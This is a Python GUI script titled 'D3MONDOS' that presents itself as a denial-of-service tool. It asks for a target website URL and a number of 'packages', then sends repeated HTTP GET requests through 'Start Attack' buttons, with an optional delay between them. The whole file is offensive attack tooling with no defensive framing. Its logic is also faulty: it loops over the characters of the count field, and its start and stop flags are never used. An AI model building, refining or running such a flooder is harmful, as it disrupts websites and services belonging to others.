import requests as req
import time
from  customtkinter import *
app= CTk()
app.geometry("800x600")
start=0
stop=1
nametool= CTkLabel(master=app,text="D3MONDOS",font=("Arial",25),text_color="#00bfff").pack()
madeby= CTkLabel(master=app,text="Made By c0de",font=("Arial",20),text_color="#00bfff").pack()
empty= CTkLabel(master=app,text="").pack() 
infoUrl= CTkLabel(master=app,text="Enter The Url of The Target Website",font=("Arial",15)).pack()
entryUrl= CTkEntry(master=app,width=300,corner_radius=32)
entryUrl.pack()
empty1= CTkLabel(master=app,text="").pack()
infoPackageNumber=CTkLabel(master=app,text="Enter The Package Number You Want To Send",font=("Arial",15)).pack()
entryPackageNumber= CTkEntry(master=app,width=300,corner_radius=32)
entryPackageNumber.pack()
entryUrl.pack()
def dos():
    url= entryUrl.get()
    if start == 0 and stop == 1:
        for i in entryPackageNumber.get():
            target= req.get(url)
            if target.status_code == 200:
                Success= CTkLabel(master=app,text="Package Succesfully Sent",font=("Arial",15),text_color="#66ff33")
                Success.pack()
            else:
                Wrong= CTkLabel(master=app,text="Package Couldn't Sent",font=("Arial",15),text_color="#ff0000")
                Wrong.pack()
buttonStart= CTkButton(master=app,text="Start Attack",corner_radius=32,fg_color="#00bfff",command=dos).pack()
empty2= CTkLabel(master=app,text="").pack()
infoDosTime= CTkLabel(master=app,text="DOS With Cooldown Between Packages",font=("Arial",20),text_color="#3333ff").pack()
infoentryTime= CTkLabel(master=app,text="Write The Time Between Packages (As Second)",font=("Arial",15)).pack()
entryTime= CTkEntry(master=app,width=300,corner_radius=32)
entryTime.pack()
def dosTime():
    url= entryUrl.get()
    if start == 0 and stop == 1:
        for i in entryPackageNumber.get():
            target = req.get(url)
            if target.status_code == 200:
                Success= CTkLabel(master=app,text="Package Succesfully Sent",font=("Arial",15),text_color="#66ff33")
                Success.pack()
            else:
                Wrong= CTkLabel(master=app,text="Package Couldn't Sent",font=("Arial",15),text_color="#ff0000")
                Wrong.pack()
            time.sleep(int(entryTime.get()))
startDosTime= CTkButton(master=app,text="Start Attack",corner_radius=32,fg_color="#00bfff",command= dosTime).pack()
app.mainloop()